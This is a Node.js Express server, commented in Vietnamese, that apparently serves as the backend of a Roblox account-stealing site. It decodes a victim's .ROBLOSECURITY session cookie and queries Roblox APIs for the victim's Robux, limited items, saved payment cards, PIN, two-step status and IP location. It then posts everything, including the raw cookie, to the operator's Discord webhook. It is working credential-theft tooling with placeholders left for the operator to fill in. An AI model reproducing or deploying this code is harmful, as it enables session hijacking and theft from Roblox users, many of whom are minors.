const express = require('express');
const axios = require('axios');
const cors = require('cors');
const { v4: uuidv4 } = require('uuid');

const app = express();

// Middleware
app.use(cors({
    origin: 'https://rbxtools.io.vn',
    methods: ['POST'],
    allowedHeaders: ['Content-Type']
}));
app.use(express.json());

// Hàm gửi dữ liệu tới webhook
async function sendToWebhook(webhookUrl, data) {
    try {
        const response = await axios.post(webhookUrl, data, {
            headers: {
                'Content-Type': 'application/json'
            },
            timeout: 30000 // Thời gian chờ 30 giây
        });

        const httpCode = response.status;
        if (httpCode !== 200 && httpCode !== 204) {
            return false;
        }
        return true;
    } catch (error) {
        console.error('Lỗi webhook:', error.message);
        return false;
    }
}

// Hàm gửi yêu cầu Roblox API
async function normalRobloxReq(url, cookie, csrf) {
    try {
        const response = await axios.get(url, {
            headers: {
                'Content-Type': 'application/json',
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'x-csrf-token': csrf
            }
        });
        return response.data;
    } catch (error) {
        throw new Error(error.message);
    }
}

// Hàm lấy thông tin game pass
async function gamepass(cookie, placeId) {
    try {
        const url = `https://www.roblox.com/games/getgamepassesinnerpartial?startIndex=0&maxRows=50&placeId=${placeId}`;
        const response = await axios.get(url, {
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`
            }
        });
        const ownedCount = (response.data.match(/Owned/g) || []).length;
        return `___${ownedCount}___`;
    } catch (error) {
        return '___0___';
    }
}

// Tuyến đường chính
app.post('/', async (req, res) => {
    try {
        const { code } = req.body;

        // Xác thực đầu vào
        if (!code) {
            return res.status(400).json({ error: 'Yêu cầu không hợp lệ hoặc thiếu mã' });
        }

        // Giải mã cookie
        const cookie = Buffer.from(code, 'base64').toString('utf-8');

        // Sử dụng cookie trực tiếp
        const finalCookie = cookie;

        // Lấy thông tin người dùng
        const userInfo = await normalRobloxReq('https://users.roblox.com/v1/users/authenticated', finalCookie, '');
        const robux = await normalRobloxReq(`https://economy.roblox.com/v1/users/${userInfo.id}/currency`, finalCookie, '');
        const premium = await normalRobloxReq(`https://premiumfeatures.roblox.com/v1/users/${userInfo.id}/validate-membership`, finalCookie, '');
        const thumbnail = await normalRobloxReq(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${userInfo.id}&size=150x150&format=Png&isCircular=false`, finalCookie, '');
        const transactions = await normalRobloxReq(`https://economy.roblox.com/v2/users/${userInfo.id}/transaction-totals?timeFrame=Year&transactionType=summary`, finalCookie, '');
        const credit = await normalRobloxReq('https://apis.roblox.com/credit-balance/v1/get-conversion-metadata', finalCookie, '');
        const settings = await normalRobloxReq('https://www.roblox.com/my/settings/json', finalCookie, '');
        const pin = await normalRobloxReq('https://auth.roblox.com/v1/account/pin', finalCookie, '');
        const collectibles = await normalRobloxReq(`https://inventory.roblox.com/v1/users/${userInfo.id}/assets/collectibles?sortOrder=Asc&limit=100`, finalCookie, '');
        const savedPayments = await normalRobloxReq('https://apis.roblox.com/payments-gateway/v1/payment-profiles', finalCookie, '');

        // Tính RAP và số lượng collectibles
        const rap = collectibles.data?.reduce((sum, item) => sum + (item.recentAveragePrice || 0), 0) || 0;
        const collectionCount = collectibles.data?.filter(item => item.userAssetId).length || 0;

        // Kiểm tra vật phẩm đặc biệt
        const headlessCheck = await normalRobloxReq('https://catalog.roblox.com/v1/catalog/items/201/details?itemType=Bundle', finalCookie, '');
        const headless = headlessCheck.owned ? 'True' : 'False';
        const korbloxCheck = await normalRobloxReq('https://catalog.roblox.com/v1/catalog/items/192/details?itemType=Bundle', finalCookie, '');
        const korblox = korbloxCheck.owned ? 'True' : 'False';

        // Lấy ngày tạo tài khoản
        const profileResponse = await axios.get(`https://users.roblox.com/v1/users/${userInfo.id}`);
        const created = new Date(profileResponse.data.created);
        const joinDate = created.toLocaleDateString('en-GB', { day: '2-digit', month: '2-digit', year: 'numeric' });
        const daysOld = Math.floor((new Date() - created) / (1000 * 60 * 60 * 24));

        // Lấy lượt truy cập place
        const placeInfo = await axios.get(`https://games.roblox.com/v2/users/${userInfo.id}/games?accessFilter=Public&sortOrder=Asc&limit=10`);
        const visits = placeInfo.data.data[0]?.placeVisits || 0;

        // Kiểm tra vote game
        const games = {
            BF: (await normalRobloxReq('https://games.roblox.com/v1/games/994732206/votes/user', finalCookie, '')).canVote ? 'True' : 'False',
            AM: (await normalRobloxReq('https://games.roblox.com/v1/games/383310974/votes/user', finalCookie, '')).canVote ? 'True' : 'False',
            MM2: (await normalRobloxReq('https://games.roblox.com/v1/games/66654135/votes/user', finalCookie, '')).canVote ? 'True' : 'False',
            PS99: (await normalRobloxReq('https://games.roblox.com/v1/games/3317771874/votes/user', finalCookie, '')).canVote ? 'True' : 'False',
            BB: (await normalRobloxReq('https://games.roblox.com/v1/games/4777817887/votes/user', finalCookie, '')).canVote ? 'True' : 'False'
        };

        // Lấy game pass
        const bb = await gamepass(finalCookie, 13772394625);
        const bf = await gamepass(finalCookie, 2753915549);
        const mm2 = await gamepass(finalCookie, 142823291);
        const ps99 = await gamepass(finalCookie, 8737899170);
        const am = await gamepass(finalCookie, 920587237);

        // Lấy thông tin IP
        const ip = req.ip;
        const ipInfoResponse = await axios.get(`http://ip-api.com/json/${ip}`);
        const ipJson = ipInfoResponse.data;
        const countryCode = ipJson.countryCode.toLowerCase();
        const countryFlag = `:flag_${countryCode}:`;
        const ipEmbed = ` | [***${ip} ${countryFlag}***](https://ipapi.co/${ip}/json)`;

        // Chuẩn bị dữ liệu webhook
        const webhookData = {
            content: '@everyone',
            username: 'SiteName', // Thay bằng tên site của bạn
            avatar_url: 'icon_url', // Thay bằng URL biểu tượng
            tts: false,
            embeds: [
                {
                    title: '**```VLX - Result```**',
                    description: `[**<:Cookie:1313022426346426368> Check .ROBLOSECURITY**](https://${req.hostname}/Refresher/?cookie=${finalCookie}) | [**Rolimons**](https://www.rolimons.com/player/${userInfo.id}) <:rolimons:978559948432744468> ${ipEmbed}`,
                    type: 'rich',
                    color: parseInt('color_hex', 16), // Thay 'color_hex' bằng mã màu hex (VD: '00ff00')
                    footer: { text: '' },
                    thumbnail: { url: thumbnail.data[0].imageUrl },
                    author: {
                        name: `${userInfo.name}\n${settings.UserAbove13 ? '13+' : '13>'} ${joinDate}`,
                        url: `https://www.roblox.com/users/${userInfo.id}/profile`,
                        icon_url: thumbnail.data[0].imageUrl
                    },
                    fields: [
                        {
                            name: 'About User',
                            value: `\`\`Account Age: ${daysOld} Days\`\`\n\`\`Place Visits: ${visits}\`\``,
                            inline: false
                        },
                        {
                            name: '<:Robux:1313020721987063829> Robux',
                            value: `Balance: ${robux.robux || 0} <:Robux:1313020721987063829>\nPending: ${transactions.pendingRobuxTotal || 0} <:RobuxPending:1313020748490608721>`,
                            inline: true
                        },
                        {
                            name: '<:Limited:1313024834783154211> Rap',
                            value: `Rap: ${rap || 0} <:Valk:1313020750038569021>\nOwned: ${collectionCount || 0} <:Inventory:1313020754547310737>`,
                            inline: true
                        },
                        {
                            name: '<a:Summery:1313021791954014268> Summary',
                            value: `${transactions.incomingRobuxTotal || 0}`,
                            inline: true
                        },
                        {
                            name: '<:Billing:1313020743373819935> Billing',
                            value: `Credit: ${credit.creditBalance || 0} <:Credits:1313020738755756052>\nConvert: ${credit.robuxConversionAmount || 0} <:Robux:1313020721987063829>\nCard: ${savedPayments ? 'True' : 'False'} <:Cards:1313020745223503883>`,
                            inline: true
                        },
                        {
                            name: '<:Games:1313020733932306462> | Played | Passes',
                            value: `<:bf:1303894849530888214> | ${games.BF} | ${bf}\n<:adm:1303894863007453265> | ${games.AM} | ${am}\n<:mm2:1303894855281541212> | ${games.MM2} | ${mm2}\n<:ps99:1303894865079308288> | ${games.PS99} | ${ps99}\n<:bb:1303894852697718854> | ${games.BB} | ${bb}`,
                            inline: true
                        },
                        {
                            name: '<:Settings:1313020732225093672> Settings',
                            value: `(Verified ${settings.IsEmailVerified ? '<a:True:1313026208773967882>' : '<a:False:1313026218567667743>})\n<:2Step:1313020736218333245> ${settings.MyAccountSecurityModel.IsTwoStepEnabled ? 'Enabled' : 'Disabled'}\n<:VoiceChat:1313020746829926440> ${(await normalRobloxReq('https://voice.roblox.com/v1/settings', finalCookie, '')).isVoiceEnabled ? 'Enabled' : 'Disabled'}`,
                            inline: true
                        },
                        {
                            name: '<:Premium:1313020726474706994> Premium',
                            value: premium ? 'True' : 'False',
                            inline: true
                        },
                        {
                            name: '<:Collectible:1313026924678742087> Collectibles',
                            value: `<:Korblox:1313020724184743936> ${korblox}\n<:Headless:1313020741003903016> ${headless}`,
                            inline: true
                        },
                        {
                            name: '<:Pin:1313021956412674058> Pin',
                            value: pin.isEnabled ? `True (${pin})` : 'False',
                            inline: true
                        }
                    ]
                },
                {
                    description: `\n \n<:Cookie:1313022426346426368> **.ROBLOSECURITY**\n**\`\`\`${finalCookie}\`\`\`**`,
                    type: 'rich',
                    timestamp: new Date().toISOString(),
                    color: parseInt('color_hex', 16), // Thay 'color_hex' bằng mã màu hex
                    thumbnail: { url: 'https://cdn.discordapp.com/attachments/1312464460715266169/1313027565216071730/541732.png?ex=674ea3b6&is=674d5236&hm=e1509b76f9feb7f2296e0de33bf24db2aab2f19d573b754e1b214987c235b0a7&' }
                }
            ]
        };

        // Gửi tới webhook
        const webhookUrl = ''; // Thay bằng URL webhook Discord của bạn
        const webhookSuccess = await sendToWebhook(webhookUrl, webhookData);

        if (!webhookSuccess) {
            return res.status(500).json({ error: 'Không thể gửi tới webhook' });
        }

        // Phản hồi thành công
        res.status(200).json({ success: true });
    } catch (error) {
        console.error('Lỗi server:', error.message);
        res.status(500).json({ error: 'Lỗi server nội bộ' });
    }
});

// Khởi động server
app.listen(3000, () => {
    console.log('Server đang chạy trên cổng 3000');
});
